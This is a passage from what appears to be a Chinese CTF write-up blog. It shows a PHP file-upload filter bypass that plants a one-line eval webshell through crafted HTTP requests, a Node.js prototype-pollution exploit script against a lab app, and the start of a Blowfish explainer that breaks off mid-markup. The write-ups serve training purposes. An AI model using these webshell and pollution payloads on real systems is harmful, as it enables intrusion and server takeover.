<li><p>  运行payload，获取admin密码的MD5值，在线解密，即可获得密码，登录获取flag；</p>
</li>
</ol>
<h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><p>PHP文件上传绕过</p>
<p>需要绕过内容：</p>
<ol>
<li><p>文件后缀</p>
<p>  依次尝试<strong>php4，phtml，phtm，phps，php5</strong>（包括一些字母改变大小写）最终发现，php4可以绕过；</p>
</li>
<li><p>  修改请求头<strong>Content-Type</strong>字段为<strong>mULtipart/form-data</strong>（注意大小写绕过）；</p>
</li>
<li><p>  修改请求数据的<strong>Content-Type</strong>字段为<strong>image/jpeg</strong>；</p>
</li>
</ol>
<p>修改前请求包</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /index.php HTTP/1.1</span><br><span class="line">Host: 114.67.246.176:19346</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:91.0) Gecko/20100101 Firefox/91.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: image/jpeg; boundary=---------------------------38261504985784834023799755966</span><br><span class="line">Content-Length: 361</span><br><span class="line">Origin: http://114.67.246.176:19346</span><br><span class="line">Connection: close</span><br><span class="line">Referer: http://114.67.246.176:19346/index.php</span><br><span class="line">Cookie: Hm_lvt_c1b044f909411ac4213045f0478e96fc=1628766579; _ga=GA1.1.306268332.1628766580</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">-----------------------------38261504985784834023799755966</span><br><span class="line">Content-Disposition: form-data; name="file"; filename="1.php4"</span><br><span class="line">Content-Type: multipart/form-data</span><br><span class="line"></span><br><span class="line">&lt;?php @eval($_POST['abc'])?&gt;</span><br><span class="line">-----------------------------38261504985784834023799755966</span><br><span class="line">Content-Disposition: form-data; name="submit"</span><br><span class="line"></span><br><span class="line">Submit</span><br><span class="line">-----------------------------38261504985784834023799755966--</span><br></pre></td></tr></table></figure>

<p>修改后请求包</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /index.php HTTP/1.1</span><br><span class="line">Host: 114.67.246.176:19346</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:91.0) Gecko/20100101 Firefox/91.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: mulTIpart/form-data; boundary=---------------------------38261504985784834023799755966</span><br><span class="line">Content-Length: 361</span><br><span class="line">Origin: http://114.67.246.176:19346</span><br><span class="line">Connection: close</span><br><span class="line">Referer: http://114.67.246.176:19346/index.php</span><br><span class="line">Cookie: Hm_lvt_c1b044f909411ac4213045f0478e96fc=1628766579; _ga=GA1.1.306268332.1628766580</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">-----------------------------38261504985784834023799755966</span><br><span class="line">Content-Disposition: form-data; name="file"; filename="1.php4"</span><br><span class="line">Content-Type: image/jpeg</span><br><span class="line"></span><br><span class="line">&lt;?php @eval($_POST['abc'])?&gt;</span><br><span class="line">-----------------------------38261504985784834023799755966</span><br><span class="line">Content-Disposition: form-data; name="submit"</span><br><span class="line"></span><br><span class="line">Submit</span><br><span class="line">-----------------------------38261504985784834023799755966--</span><br></pre></td></tr></table></figure>

<p>上传一句话木马，连接即可；</p>
<p>关于Content-Type参考<a href="https://www.cnblogs.com/52fhy/p/5436673.html">https://www.cnblogs.com/52fhy/p/5436673.html</a></p>
<h2 id="sodirty"><a href="#sodirty" class="headerlink" title="sodirty"></a>sodirty</h2><p>Node.js原型链污染；</p>
<ol>
<li><p>扫描目录，发现<code>www.zip</code>文件， 解压缩，打开<code>index.js</code>得到源代码发现**<code>set-value</code>**，判断存在js原型链污染，代码如下：</p>
  <figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">'express'</span>);</span><br><span class="line"><span class="keyword">const</span> setFn = <span class="built_in">require</span>(<span class="string">'set-value'</span>);</span><br><span class="line"><span class="keyword">var</span> router = express.<span class="title class_">Router</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title class_">Admin</span> = {</span><br><span class="line">    <span class="string">"password"</span>:process.<span class="property">env</span>.<span class="property">password</span>?process.<span class="property">env</span>.<span class="property">password</span>:<span class="string">"password"</span></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">router.<span class="title function_">post</span>(<span class="string">"/getflag"</span>, <span class="keyword">function</span> (<span class="params">req, res, next</span>) {</span><br><span class="line">    <span class="keyword">if</span> (req.<span class="property">body</span>.<span class="property">password</span> === <span class="literal">undefined</span> || req.<span class="property">body</span>.<span class="property">password</span> === req.<span class="property">session</span>.<span class="property">challenger</span>.<span class="property">password</span>){</span><br><span class="line">        res.<span class="title function_">send</span>(<span class="string">"登录失败"</span>);</span><br><span class="line">    }<span class="keyword">else</span>{</span><br><span class="line">        <span class="keyword">if</span>(req.<span class="property">session</span>.<span class="property">challenger</span>.<span class="property">age</span> &gt; <span class="number">79</span>){</span><br><span class="line">            res.<span class="title function_">send</span>(<span class="string">"糟老头子坏滴很"</span>);</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">let</span> key = req.<span class="property">body</span>.<span class="property">key</span>.<span class="title function_">toString</span>();</span><br><span class="line">        <span class="keyword">let</span> password = req.<span class="property">body</span>.<span class="property">password</span>.<span class="title function_">toString</span>();</span><br><span class="line">        <span class="keyword">if</span>(<span class="title class_">Admin</span>[key] === password){</span><br><span class="line">            res.<span class="title function_">send</span>(process.<span class="property">env</span>.<span class="property">flag</span> ? process.<span class="property">env</span>.<span class="property">flag</span> : <span class="string">"flag{test}"</span>);</span><br><span class="line">        }<span class="keyword">else</span> {</span><br><span class="line">            res.<span class="title function_">send</span>(<span class="string">"密码错误，请使用管理员用户名登录."</span>);</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">});</span><br><span class="line"></span><br><span class="line">router.<span class="title function_">get</span>(<span class="string">'/reg'</span>, <span class="keyword">function</span> (<span class="params">req, res, next</span>) {</span><br><span class="line">    req.<span class="property">session</span>.<span class="property">challenger</span> = {</span><br><span class="line">        <span class="string">"username"</span>: <span class="string">"user"</span>,</span><br><span class="line">        <span class="string">"password"</span>: <span class="string">"pass"</span>,</span><br><span class="line">        <span class="string">"age"</span>: <span class="number">80</span></span><br><span class="line">    }</span><br><span class="line">    res.<span class="title function_">send</span>(<span class="string">"用户创建成功!"</span>);</span><br><span class="line">});</span><br><span class="line"></span><br><span class="line">router.<span class="title function_">get</span>(<span class="string">'/'</span>, <span class="keyword">function</span> (<span class="params">req, res, next</span>) {</span><br><span class="line">    res.<span class="title function_">redirect</span>(<span class="string">'index'</span>);</span><br><span class="line">});</span><br><span class="line"></span><br><span class="line">router.<span class="title function_">get</span>(<span class="string">'/index'</span>, <span class="keyword">function</span> (<span class="params">req, res, next</span>) {</span><br><span class="line">    res.<span class="title function_">send</span>(<span class="string">'&lt;title&gt;BUGKU-登录&lt;/title&gt;&lt;h1&gt;前端被炒了&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;a href="./reg"&gt;注册&lt;/a&gt;'</span>);</span><br><span class="line">});</span><br><span class="line"></span><br><span class="line">router.<span class="title function_">post</span>(<span class="string">"/update"</span>, <span class="keyword">function</span> (<span class="params">req, res, next</span>) {</span><br><span class="line">    <span class="keyword">if</span>(req.<span class="property">session</span>.<span class="property">challenger</span> === <span class="literal">undefined</span>){</span><br><span class="line">        res.<span class="title function_">redirect</span>(<span class="string">'/reg'</span>);</span><br><span class="line">    }<span class="keyword">else</span>{</span><br><span class="line">        <span class="keyword">if</span> (req.<span class="property">body</span>.<span class="property">attrkey</span> === <span class="literal">undefined</span> || req.<span class="property">body</span>.<span class="property">attrval</span> === <span class="literal">undefined</span>) {</span><br><span class="line">            res.<span class="title function_">send</span>(<span class="string">"传参有误"</span>);</span><br><span class="line">        }<span class="keyword">else</span> {</span><br><span class="line">            <span class="keyword">let</span> key = req.<span class="property">body</span>.<span class="property">attrkey</span>.<span class="title function_">toString</span>();</span><br><span class="line">            <span class="keyword">let</span> value = req.<span class="property">body</span>.<span class="property">attrval</span>.<span class="title function_">toString</span>();</span><br><span class="line">            <span class="title function_">setFn</span>(req.<span class="property">session</span>.<span class="property">challenger</span>, key, value);</span><br><span class="line">            res.<span class="title function_">send</span>(<span class="string">"修改成功"</span>);</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">});</span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = router;</span><br></pre></td></tr></table></figure></li>
<li><p>分析代码发现：</p>
<ol>
<li>  可以通过<code>/getflag</code>路由获取flag；</li>
<li>  需要传参<code>key</code>、<code>password</code>两个参数；</li>
<li>  需要用户的<code>age&lt;=79</code>；</li>
<li>  需要满足<code>Admin[key]==password</code>，其中<code>passwod</code>可以控制，而<code>Admin[key]</code>未知；</li>
</ol>
</li>
<li><p>  <code>age</code>变量已经存在，可以通过POST传参覆盖；</p>
</li>
<li><p>对于Admin对象，只有一个属性 password，要求key携带的属性不是password，则需要指定的属性，可以根据两者共同的父类object设置。关于原型链泄露，子类调用找不到的属性时，会默认去一直向上找父类可以继承的属性，通过<code>__proto__.passwd</code>更改<code>challenger</code>和<code>Admin</code>共同的父类<code>object</code>，增加一个属性<code>passwd</code>，指定值，然后把<code>key</code>设置成<code>passwd</code>，<code>password</code>设置为<code>object</code>赋的<code>passwd</code>值，就可以绕过判断，得到flag。</p>
  <figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title class_">Admin</span> = {</span><br><span class="line">    <span class="string">"password"</span>:process.<span class="property">env</span>.<span class="property">password</span>?process.<span class="property">env</span>.<span class="property">password</span>:<span class="string">"password"</span></span><br><span class="line">}</span><br></pre></td></tr></table></figure>
</li>
<li><p>编写payload如下：</p>
  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># payload.py</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">s = requests.session()</span><br><span class="line"><span class="comment"># URI</span></span><br><span class="line">url = <span class="string">"http://114.67.246.176:10038/"</span></span><br><span class="line">reg = url + <span class="string">"reg"</span></span><br><span class="line">update = url + <span class="string">"update"</span></span><br><span class="line">getflag = url + <span class="string">"getflag"</span></span><br><span class="line"><span class="comment"># 登录</span></span><br><span class="line">r=s.get(reg)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br><span class="line"><span class="comment"># POST传参，修改age</span></span><br><span class="line">data1={<span class="string">"attrkey"</span>:<span class="string">"age"</span>,<span class="string">"attrval"</span>:<span class="string">"78"</span>}</span><br><span class="line">r=s.post(update, data=data1)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br><span class="line"><span class="comment"># __proto__.passwd更改challenger和Admin共同的父类object，增加属性passwd，设置值为abc</span></span><br><span class="line">data2={<span class="string">"attrkey"</span>:<span class="string">"__proto__.passwd"</span>,<span class="string">"attrval"</span>:<span class="string">"abc"</span>}</span><br><span class="line">r=s.post(update, data=data2)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br><span class="line"><span class="comment"># 将key设置成passwd，password设置给object赋的passwd值abc</span></span><br><span class="line">data3={<span class="string">"password"</span>:<span class="string">"abc"</span>,<span class="string">"key"</span>:<span class="string">"passwd"</span>}</span><br><span class="line">r=s.post(getflag, data=data3)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure></li>
</ol>
]]></content>
      <categories>
        <category>WriteUp</category>
      </categories>
      <tags>
        <tag>WEB</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>Blowfish加密算法</title>
    <url>/Blowfish%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95.html</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>Blowfish是一个<strong>对称密钥加密分组密码算法</strong>，由Bruce Schneier于1993年设计，意在替代老旧的DES及避免其他算法的问题与限制。Blowfish刚刚研发出的时候，大部分其他加密算法是专利所有的或属于商业(政府)机密，所以发展起来非常受限制。Schneier则声明Blowfish的使用没有任何限制，任何国家任何人任何时候都可以随意使用Blowfish算法。<span id="more"></span></p>
<h1 id="Blowfish加密简介"><a href="#Blowfish加密简介" class="headerlink" title="Blowfish加密简介"></a>Blowfish加密简介</h1><p>Blowfish是一种<strong>可变密钥长度的64 位分组密码</strong>。该算法由两部分组成：<strong>密钥扩展部分</strong>和<strong>数据加密部分</strong>。密钥扩展将最多448bits的密钥转换为多个子密钥数组，总计 4168 字节。    </p>
<h2 id="密钥（Key）"><a href="#密钥（Key）" class="headerlink" title="密钥（Key）"></a>密钥（Key）</h2><p>Blowfish 是一种<strong>可变密钥长度的64 位分组密码</strong>，其密钥<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.464ex;" xmlns="http://www.w3.org/2000/svg" width="4.174ex" height="2.009ex" role="img" focusable="false" viewBox="0 -683 1845 888"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D43E" d="M285 628Q285 635 228 637Q205 637 198 638T191 647Q191 649 193 661Q199 681 203 682Q205 683 214 683H219Q260 681 355 681Q389 681 418 681T463 682T483 682Q500 682 500 674Q500 669 497 660Q496 658 496 654T495 648T493 644T490 641T486 639T479 638T470 637T456 637Q416 636 405 634T387 623L306 305Q307 305 490 449T678 597Q692 611 692 620Q692 635 667 637Q651 637 651 648Q651 650 654 662T659 677Q662 682 676 682Q680 682 711 681T791 680Q814 680 839 681T869 682Q889 682 889 672Q889 650 881 642Q878 637 862 637Q787 632 726 586Q710 576 656 534T556 455L509 418L518 396Q527 374 546 329T581 244Q656 67 661 61Q663 59 666 57Q680 47 717 46H738Q744 38 744 37T741 19Q737 6 731 0H720Q680 3 625 3Q503 3 488 0H478Q472 6 472 9T474 27Q478 40 480 43T491 46H494Q544 46 544 71Q544 75 517 141T485 216L427 354L359 301L291 248L268 155Q245 63 245 58Q245 51 253 49T303 46H334Q340 37 340 35Q340 19 333 5Q328 0 317 0Q314 0 280 1T180 2Q118 2 85 2T49 1Q31 1 31 11Q31 13 34 25Q38 41 42 43T65 46Q92 46 125 49Q139 52 144 61Q147 65 216 339T285 628Z"></path></g><g data-mml-node="mi" transform="translate(889,0)"><path data-c="1D452" d="M39 168Q39 225 58 272T107 350T174 402T244 433T307 442H310Q355 442 388 420T421 355Q421 265 310 237Q261 224 176 223Q139 223 138 221Q138 219 132 186T125 128Q125 81 146 54T209 26T302 45T394 111Q403 121 406 121Q410 121 419 112T429 98T420 82T390 55T344 24T281 -1T205 -11Q126 -11 83 42T39 168ZM373 353Q367 405 305 405Q272 405 244 391T199 357T170 316T154 280T149 261Q149 260 169 260Q282 260 327 284T373 353Z"></path></g><g data-mml-node="mi" transform="translate(1355,0)"><path data-c="1D466" d="M21 287Q21 301 36 335T84 406T158 442Q199 442 224 419T250 355Q248 336 247 334Q247 331 231 288T198 191T182 105Q182 62 196 45T238 27Q261 27 281 38T312 61T339 94Q339 95 344 114T358 173T377 247Q415 397 419 404Q432 431 462 431Q475 431 483 424T494 412T496 403Q496 390 447 193T391 -23Q363 -106 294 -155T156 -205Q111 -205 77 -183T43 -117Q43 -95 50 -80T69 -58T89 -48T106 -45Q150 -45 150 -87Q150 -107 138 -122T115 -142T102 -147L99 -148Q101 -153 118 -160T152 -167H160Q177 -167 186 -165Q219 -156 247 -127T290 -65T313 -9T321 21L315 17Q309 13 296 6T270 -6Q250 -11 231 -11Q185 -11 150 11T104 82Q103 89 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g></g></g></svg></mjx-container>长度可去范围是1-448bits。</p>
<h2 id="子密钥（Subkey）"><a href="#子密钥（Subkey）" class="headerlink" title="子密钥（Subkey）"></a>子密钥（Subkey）</h2><p>Blowfish使用了大量的子密钥。在进行任何数据加密或解密之前，必须预先计算这些密钥。</p>
<h3 id="P数组"><a href="#P数组" class="headerlink" title="P数组"></a>P数组</h3><p>P数组由18个32bits的子密钥组成；</p>
<p><mjx-container class="MathJax" jax="SVG" display="true"><svg style="vertical-align: -0.439ex;" xmlns="http://www.w3.org/2000/svg" width="14.167ex" height="1.984ex" role="img" focusable="false" viewBox="0 -683 6261.9 877"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D443" d="M287 628Q287 635 230 637Q206 637 199 638T192 648Q192 649 194 659Q200 679 203 681T397 683Q587 682 600 680Q664 669 707 631T751 530Q751 453 685 389Q616 321 507 303Q500 302 402 301H307L277 182Q247 66 247 59Q247 55 248 54T255 50T272 48T305 46H336Q342 37 342 35Q342 19 335 5Q330 0 319 0Q316 0 282 1T182 2Q120 2 87 2T51 1Q33 1 33 11Q33 13 36 25Q40 41 44 43T67 46Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628ZM645 554Q645 567 643 575T634 597T609 619T560 635Q553 636 480 637Q463 637 445 637T416 636T404 636Q391 635 386 627Q384 621 367 550T332 412T314 344Q314 342 395 342H407H430Q542 342 590 392Q617 419 631 471T645 554Z"></path></g><g data-mml-node="mn" transform="translate(675,-150) scale(0.707)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g></g><g data-mml-node="mo" transform="translate(1078.6,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="msub" transform="translate(1523.2,0)"><g data-mml-node="mi"><path data-c="1D443" d="M287 628Q287 635 230 637Q206 637 199 638T192 648Q192 649 194 659Q200 679 203 681T397 683Q587 682 600 680Q664 669 707 631T751 530Q751 453 685 389Q616 321 507 303Q500 302 402 301H307L277 182Q247 66 247 59Q247 55 248 54T255 50T272 48T305 46H336Q342 37 342 35Q342 19 335 5Q330 0 319 0Q316 0 282 1T182 2Q120 2 87 2T51 1Q33 1 33 11Q33 13 36 25Q40 41 44 43T67 46Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628ZM645 554Q645 567 643 575T634 597T609 619T560 635Q553 636 480 637Q463 637 445 637T416 636T404 636Q391 635 386 627Q384 621 367 550T332 412T314 344Q314 342 395 342H407H430Q542 342 590 392Q617 419 631 471T645 554Z"></path></g><g data-mml-node="mn" transform="translate(675,-150) scale(0.707)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g></g><g data-mml-node="mo" transform="translate(2601.8,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="mo" transform="translate(3046.4,0)"><path data-c="2026" d="M78 60Q78 84 95 102T138 120Q162 120 180 104T199 61Q199 36 182 18T139 0T96 17T78 60ZM525 60Q525 84 542 102T585 120Q609 120 627 104T646 61Q646 36 629 18T586 0T543 17T525 60ZM972 60Q972 84 989 102T1032 120Q1056 120 1074 104T1093 61Q1093 36 1076 18T1033 0T990 17T972 60Z"></path></g><g data-mml-node="mo" transform="translate(4385.1,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="msub" transform="translate(4829.8,0)"><g data-mml-node="mi"><path data-c="1D443" d="M287 628Q287 635 230 637Q206 637 199 638T192 648Q192 649 194 659Q200 679 203 681T397 683Q587 682 600 680Q664 669 707 631T751 530Q751 453 685 389Q616 321 507 303Q500 302 402 301H307L277 182Q247 66 247 59Q247 55 248 54T255 50T272 48T305 46H336Q342 37 342 35Q342 19 335 5Q330 0 319 0Q316 0 282 1T182 2Q120 2 87 2T51 1Q33 1 33 11Q33 13 36 25Q40 41 44 43T67 46Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628ZM645 554Q645 567 643 575T634 597T609 619T560 635Q553 636 480 637Q463 637 445 637T416 636T404 636Q391 635 386 627Q384 621 367 550T332 412T314 344Q314 342 395 342H407H430Q542 342 590 392Q617 419 631 471T645 554Z"></path></g><g data-mml-node="TeXAtom" transform="translate(675,-150) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mn"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path><path data-c="38" d="M70 417T70 494T124 618T248 666Q319 666 374 624T429 515Q429 485 418 459T392 417T361 389T335 371T324 363L338 354Q352 344 366 334T382 323Q457 264 457 174Q457 95 399 37T249 -22Q159 -22 101 29T43 155Q43 263 172 335L154 348Q133 361 127 368Q70 417 70 494ZM286 386L292 390Q298 394 301 396T311 403T323 413T334 425T345 438T355 454T364 471T369 491T371 513Q371 556 342 586T275 624Q268 625 242 625Q201 625 165 599T128 534Q128 511 141 492T167 463T217 431Q224 426 228 424L286 386ZM250 21Q308 21 350 55T392 137Q392 154 387 169T375 194T353 216T330 234T301 253T274 270Q260 279 244 289T218 306L210 311Q204 311 181 294T133 239T107 157Q107 98 150 60T250 21Z" transform="translate(500,0)"></path></g></g></g></g></g></svg></mjx-container></p>
<h3 id="S盒"><a href="#S盒" class="headerlink" title="S盒"></a>S盒</h3><p>需要4个S盒，每个S盒由256个32bits的数据组成；</p>
<p><mjx-container class="MathJax" jax="SVG" display="true"><svg style="vertical-align: -0.8ex;" xmlns="http://www.w3.org/2000/svg" width="22.238ex" height="2.395ex" role="img" focusable="false" viewBox="0 -705 9829.2 1058.5"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D446" d="M308 24Q367 24 416 76T466 197Q466 260 414 284Q308 311 278 321T236 341Q176 383 176 462Q176 523 208 573T273 648Q302 673 343 688T407 704H418H425Q521 704 564 640Q565 640 577 653T603 682T623 704Q624 704 627 704T632 705Q645 705 645 698T617 577T585 459T569 456Q549 456 549 465Q549 471 550 475Q550 478 551 494T553 520Q553 554 544 579T526 616T501 641Q465 662 419 662Q362 662 313 616T263 510Q263 480 278 458T319 427Q323 425 389 408T456 390Q490 379 522 342T554 242Q554 216 546 186Q541 164 528 137T492 78T426 18T332 -20Q320 -22 298 -22Q199 -22 144 33L134 44L106 13Q83 -14 78 -18T65 -22Q52 -22 52 -14Q52 -11 110 221Q112 227 130 227H143Q149 221 149 216Q149 214 148 207T144 186T142 153Q144 114 160 87T203 47T255 29T308 24Z"></path></g><g data-mml-node="TeXAtom" transform="translate(646,-176.7) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mo"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mn" transform="translate(389,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g><g data-mml-node="mo" transform="translate(889,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="mn" transform="translate(1167,0)"><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z"></path></g><g data-mml-node="mo" transform="translate(1667,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g></g><g data-mml-node="mo" transform="translate(2149.8,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="msub" transform="translate(2594.5,0)"><g data-mml-node="mi"><path data-c="1D446" d="M308 24Q367 24 416 76T466 197Q466 260 414 284Q308 311 278 321T236 341Q176 383 176 462Q176 523 208 573T273 648Q302 673 343 688T407 704H418H425Q521 704 564 640Q565 640 577 653T603 682T623 704Q624 704 627 704T632 705Q645 705 645 698T617 577T585 459T569 456Q549 456 549 465Q549 471 550 475Q550 478 551 494T553 520Q553 554 544 579T526 616T501 641Q465 662 419 662Q362 662 313 616T263 510Q263 480 278 458T319 427Q323 425 389 408T456 390Q490 379 522 342T554 242Q554 216 546 186Q541 164 528 137T492 78T426 18T332 -20Q320 -22 298 -22Q199 -22 144 33L134 44L106 13Q83 -14 78 -18T65 -22Q52 -22 52 -14Q52 -11 110 221Q112 227 130 227H143Q149 221 149 216Q149 214 148 207T144 186T142 153Q144 114 160 87T203 47T255 29T308 24Z"></path></g><g data-mml-node="TeXAtom" transform="translate(646,-176.7) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mo"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mn" transform="translate(389,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g><g data-mml-node="mo" transform="translate(889,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="mn" transform="translate(1167,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g><g data-mml-node="mo" 